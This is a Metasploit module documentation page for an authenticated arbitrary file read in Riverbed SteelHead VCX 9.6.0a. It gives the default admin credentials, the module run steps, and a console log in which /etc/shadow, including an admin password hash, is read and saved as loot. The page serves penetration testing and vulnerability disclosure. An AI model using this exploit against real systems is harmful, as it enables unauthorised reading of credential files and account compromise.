This module exploits an authenticated arbitrary file read in the log module's filter engine.

## Vulnerable Application

The application is available for a 90 day evaluation after free registration from
[riverbed](https://www.riverbed.com/gb/products/steelhead/Free-90-day-Evaluation-SteelHead-CX-Virtual-Edition.html).  
Downloads are available for Hyper-V, ESX(i), and KVM.  Installation is straight forward, initial login is `admin`/`password`.
If need be from cli, to show the IP address of the device: `show interfaces primary`

This module was successfully tested against:

- SteelHead VCX (VCX255U) 9.6.0a

## Verification Steps

1. Do: ```auxiliary/scanner/http/riverbed_steelhead_vcx_file_read```
2. Do: ```set RHOSTS [IP]```
3. Set TARGETURI if necessary.
3. Set FILE if necessary.
3. Set USERNAME if necessary.
3. Set PASSWORD if necessary.
4. Do: ```run```

## Scenarios

### SteelHead VCX255u 9.6.0a running on ESXi

```
resource (riverbed.rc)> use auxiliary/scanner/http/riverbed_steelhead_vcx_file_read
resource (riverbed.rc)> set rhosts 192.168.2.198
rhosts => 192.168.2.198
resource (riverbed.rc)> set verbose true
verbose => true
resource (riverbed.rc)> run
[*] CSRF Token: 18PK64EKpo4d6y0X5ZOMYJ3fxfYZKfrN
[+] Authenticated Successfully
[+] File Contents:
admin:$6$sKOU5moa$B2szxiSEzq6ZmHZw01CMf64WlzvqIgCYETeXzF1ItxZ5soOJNVXdE2H5N19t0cPeGDf/LGvRymgQHAxgojr6u1:10000:0:99999:7:::
administrator:*:10000:0:99999:7:::
apache:*:10000:0:99999:7:::
localvixuser:*:10000:0:99999:7:::
named:*:10000:0:99999:7:::
nobody:*:10000:0:99999:7:::
ntp:*:10000:0:99999:7:::
pcap:*:10000:0:99999:7:::
postgres:*:10000:0:99999:7:::
rcud:*:10000:0:99999:7:::
root:*:10000:0:99999:7:::
rpc:*:10000:0:99999:7:::
shark:*:10000:0:99999:7:::
sshd:*:10000:0:99999:7:::
statsd:*:10000:0:99999:7:::
webproxy::10000:0:99999:7:::
[+] Stored /etc/shadow to /root/.msf4/loot/20170602230238_default_192.168.2.198_host.file_311580.txt
[*] Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed
```